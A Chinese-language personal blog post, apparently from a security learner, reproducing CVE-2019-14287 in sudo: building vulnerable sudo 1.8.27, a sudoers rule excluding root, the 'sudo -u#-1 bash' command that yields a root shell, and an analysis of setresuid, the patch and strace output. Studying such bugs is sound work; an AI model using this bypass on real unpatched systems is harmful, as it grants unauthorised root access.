@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="用户态cve复现CVE-2019-14287(sudo 逻辑漏洞提权)适用范围 sudo版本 &lt; 1.8.28  环境复现 sudo源码下载  1234567891011povcfe@work:~$ sudo apt-cache showsrc sudo...Homepage: http:&#x2F;&#x2F;www.sudo.ws&#x2F;Vcs-Browser: https:&#x2F;&#x2F;salsa.debian.org&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UserCVE">
+<meta property="og:url" content="http://example.com/2021/04/26/user/index.html">
+<meta property="og:site_name" content="Foxllb的个人空间">
+<meta property="og:description" content="用户态cve复现CVE-2019-14287(sudo 逻辑漏洞提权)适用范围 sudo版本 &lt; 1.8.28  环境复现 sudo源码下载  1234567891011povcfe@work:~$ sudo apt-cache showsrc sudo...Homepage: http:&#x2F;&#x2F;www.sudo.ws&#x2F;Vcs-Browser: https:&#x2F;&#x2F;salsa.debian.org&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-26T04:20:42.000Z">
+<meta property="article:modified_time" content="2021-04-26T04:22:32.197Z">
+<meta property="article:author" content="foxllb">
+<meta property="article:tag" content="user">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/04/26/user/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>UserCVE | Foxllb的个人空间</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Foxllb的个人空间</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/26/user/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="foxllb">
+      <meta itemprop="description" content="记录foxllb的安全学习历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Foxllb的个人空间">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UserCVE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-26 12:20:42 / 修改时间：12:22:32" itemprop="dateCreated datePublished" datetime="2021-04-26T12:20:42+08:00">2021-04-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="用户态cve复现"><a href="#用户态cve复现" class="headerlink" title="用户态cve复现"></a>用户态cve复现</h1><h2 id="CVE-2019-14287-sudo-逻辑漏洞提权"><a href="#CVE-2019-14287-sudo-逻辑漏洞提权" class="headerlink" title="CVE-2019-14287(sudo 逻辑漏洞提权)"></a>CVE-2019-14287(sudo 逻辑漏洞提权)</h2><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
+<li>sudo版本 &lt; 1.8.28</li>
+</ul>
+<h3 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h3><ul>
+<li>sudo源码下载</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">povcfe@work:~$ sudo apt-cache showsrc sudo</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Homepage: http://www.sudo.ws/</span><br><span class="line">Vcs-Browser: https://salsa.debian.org/debian/sudo</span><br><span class="line">Vcs-Git: https://salsa.debian.org/debian/sudo.git</span><br><span class="line">Directory: pool/main/s/sudo</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Homepage表示sudo官方网站, 定位到https://www.sudo.ws/download_mirrors.html, 是sudo源码的镜像站, 挂代理后任选镜像站下载 &lt; 1.8.28版本源码, 这里选择1.8.27版本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编译(make uninstall时报错, 建议提前拍摄虚拟机快照, 以便复现cve后继续正常使用虚拟机)</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">povcfe@ub16:~/downloads/sudo-1.8.27$ ./configure</span><br><span class="line">povcfe@ub16:~/downloads/sudo-1.8.27$ make</span><br><span class="line">povcfe@ub16:~/downloads/sudo-1.8.27$ sudo make install</span><br><span class="line">povcfe@ub16:~/downloads/sudo-1.8.27$ <span class="built_in">which</span> sudo</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/sudo</span><br></pre></td></tr></table></figure>
+
+<h3 id="验证提权思路"><a href="#验证提权思路" class="headerlink" title="验证提权思路"></a>验证提权思路</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ub16:/etc<span class="comment"># useradd fake</span></span><br><span class="line">root@ub16:/etc<span class="comment"># passwd fake</span></span><br><span class="line">Enter new UNIX password:</span><br><span class="line">Retype new UNIX password:</span><br><span class="line">passwd: password updated successfully</span><br><span class="line"></span><br><span class="line"><span class="comment"># ++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># 修改/etc/sudoer可以使得fake以非root权限执行任意指令(这里对指令和身份可以做更严格的限制, 不影响提权)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line">fake ALL=(ALL,!root) ALL</span><br><span class="line"><span class="comment"># ++++++++++++++++++++</span></span><br><span class="line"></span><br><span class="line">root@ub16:/etc<span class="comment"># su fake</span></span><br><span class="line">fake@ub16:/etc$ sudo bash</span><br><span class="line">Password:</span><br><span class="line">Sorry, user fake is not allowed to execute <span class="string">&#x27;/bin/bash&#x27;</span> as root on ub16.</span><br><span class="line">fake@ub16:/etc$ sudo -u<span class="comment">#-1 bash</span></span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得root shell</span></span><br><span class="line">root@ub16:/etc<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1003(fake) groups=1003(fake)</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h3><h4 id="ruid-euid-suid"><a href="#ruid-euid-suid" class="headerlink" title="ruid, euid, suid"></a>ruid, euid, suid</h4><ul>
+<li><p>ruid(real uid), 用户实际id</p>
+</li>
+<li><p>euid(effective uid), 用户当前的有效id, 决定用户当前状态对资源的访问权限</p>
+</li>
+<li><p>suid(set uid ID upon execution) 指文件权限对外开放, 当其他用户运行此文件时, 拥有与文件拥有者相同权限</p>
+</li>
+<li><p>举例:</p>
+<ul>
+<li><p>root(uid = 0, euid = 0) 设置 chmod +s file, 则file文件被标志为suid</p>
+</li>
+<li><p>povcfe(uid = 1000, euid = 1000) 执行file文件, 此时权限: povcfe(uid = 1000, euid = 0), povcfe可以通过file访问root资源</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="setresuid"><a href="#setresuid" class="headerlink" title="setresuid"></a>setresuid</h4><ul>
+<li><p>setresuid可以被理解成setruid_euid_suid, 即同时设置ruid, euid, suid</p>
+</li>
+<li><p>setresuid(new_ruid, new_euid, new_suid) 执行成功条件:</p>
+<ul>
+<li><p>old_ruid, old_euid, old_suid任一项为0, setresuid必执行成功, ruid, euid, suid, 被同时修改为new</p>
+</li>
+<li><p>old_ruid, old_euid, old_suid 中的任一个id值必须在 ruid, euid, suid中出现</p>
+</li>
+</ul>
+</li>
+<li><p>特殊情况setresuid(-1, -1, -1), 不更改用户权限(原因如下):setresuid -&gt;  setresuid32 -&gt; sys_setresuid</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// prepare_creds 创建新的cred() --- 当前cred的拷贝</span></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line">old = current_cred();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据ruid, euid, suid 修改new_cred</span></span><br><span class="line"><span class="comment">// 如果ruid =e uid = suid = -1, 不对new_cred做修改</span></span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="keyword">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">	<span class="keyword">new</span>-&gt;uid = kruid;</span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(kruid, old-&gt;uid)) &#123;</span><br><span class="line">	retval = set_user(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (euid != (<span class="keyword">uid_t</span>) <span class="number">-1</span>)</span><br><span class="line">	<span class="keyword">new</span>-&gt;euid = keuid;</span><br><span class="line"><span class="keyword">if</span> (suid != (<span class="keyword">uid_t</span>) <span class="number">-1</span>)</span><br><span class="line">	<span class="keyword">new</span>-&gt;suid = ksuid;</span><br><span class="line"><span class="keyword">new</span>-&gt;fsuid = <span class="keyword">new</span>-&gt;euid;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交new_cred, 进程权限被修改</span></span><br><span class="line"><span class="keyword">return</span> commit_creds(<span class="keyword">new</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="patch-分析"><a href="#patch-分析" class="headerlink" title="patch 分析"></a>patch 分析</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7">patch链接</a>, 从中定位到与当前cve相关的描述: Disallow id -1, which means “no change”, 断定此处为对于漏洞的修补, 该修复限定(llval != -1 || llval != (id_t)UINT_MAX)</li>
+</ul>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    /* Disallow id -1, which means &quot;no change&quot;. */</span></span><br><span class="line"><span class="addition">+    if (!valid_separator(p, ep, sep) || llval == -1 || llval == (id_t)UINT_MAX) &#123;</span></span><br><span class="line"> 	if (errstr != NULL)</span><br><span class="line"> 	    *errstr = N_(&quot;invalid value&quot;);</span><br><span class="line"> 	errno = EINVAL;</span><br><span class="line"> 	goto done;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>patch位于sudo_strtoid_v1函数, 回到1.8.25版本sudo源码的sudo_strtoid_v1, 查看函数逻辑</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将用户输入id转换为long long int</span></span><br><span class="line">llval = strtoll(p, &amp;ep, <span class="number">10</span>);</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以看到为数不多的id安全检测只关注了large, small, 忽略了-1这种特殊情况, 也就是说, 当sudo指定用户id为-1时, (ruid, euid, suid)不会被setresuid修改, 从而维持当前状态(1000, 0, 0), 于是sudo以eid=0的身份继续执行(漏洞点)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (errno == ERANGE) &#123;</span><br><span class="line"><span class="keyword">if</span> (errstr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (llval == LLONG_MAX)</span><br><span class="line">	*errstr = N_(<span class="string">&quot;value too large&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	*errstr = N_(<span class="string">&quot;value too small&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="验证分析"><a href="#验证分析" class="headerlink" title="验证分析"></a>验证分析</h4><ul>
+<li>跟踪系统调用setuid, setresuid(注意最后两次系统调用setuid(0) + setresuid), 设置uid=0成功后, -u#-1对应的setresuid(-1, -1, -1)保持原权限(0, 0, 0)</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@ub16:/home/povcfe<span class="comment"># strace -u cve -e setuid,setresuid sudo -u#-1 id</span></span><br><span class="line">setresuid(0, -1, -1)                    = 0</span><br><span class="line">setresuid(-1, 1, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 1, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(1001, -1, -1)                 = 0</span><br><span class="line">setresuid(-1, -1, -1)                   = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, -1, -1)                   = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(0, -1, -1)                    = 0</span><br><span class="line">setresuid(1001, -1, -1)                 = 0</span><br><span class="line">setresuid(-1, -1, -1)                   = 0</span><br><span class="line">setuid(0)                               = 0</span><br><span class="line">setresuid(-1, -1, -1)                   = 0</span><br><span class="line">uid=0(root) gid=1001(cve) groups=1001(cve)</span><br><span class="line"></span><br><span class="line">root@ub16:/home/povcfe<span class="comment"># strace -u cve -e setuid,setresuid sudo -u#1001 id</span></span><br><span class="line">setresuid(0, -1, -1)                    = 0</span><br><span class="line">setresuid(-1, 1, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 1, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(1001, -1, -1)                 = 0</span><br><span class="line">setresuid(-1, 1001, -1)                 = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 1001, -1)                 = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(-1, 0, -1)                    = 0</span><br><span class="line">setresuid(0, -1, -1)                    = 0</span><br><span class="line">setresuid(1001, -1, -1)                 = 0</span><br><span class="line">setresuid(-1, -1, -1)                   = 0</span><br><span class="line">setuid(0)                               = 0</span><br><span class="line">setresuid(1001, 1001, 1001)             = 0</span><br><span class="line">uid=1001(cve) gid=1001(cve) groups=1001(cve)</span><br><span class="line">+++ exited with 0 +++</span><br><span class="line">root@ub16:/home/povcfe<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
+<li><p>strace 跟踪系统调用 + systemtap 跟踪内核事件</p>
+</li>
+<li><p>代码审计非常重要, 现有的fuzz是很难发现该漏洞的  </p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/user/" rel="tag"># user</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/26/kernel/" rel="prev" title="KernelCVE.md">
+      <i class="fa fa-chevron-left"></i> KernelCVE.md
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%80%81cve%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">用户态cve复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2019-14287-sudo-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">1.1.</span> <span class="nav-text">CVE-2019-14287(sudo 逻辑漏洞提权)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="nav-number">1.1.1.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">环境复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.3.</span> <span class="nav-text">验证提权思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.4.</span> <span class="nav-text">相关原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ruid-euid-suid"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">ruid, euid, suid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setresuid"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">setresuid</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.5.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch-%E5%88%86%E6%9E%90"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">patch 分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">验证分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.1.6.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">foxllb</p>
+  <div class="site-description" itemprop="description">记录foxllb的安全学习历程</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">foxllb</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
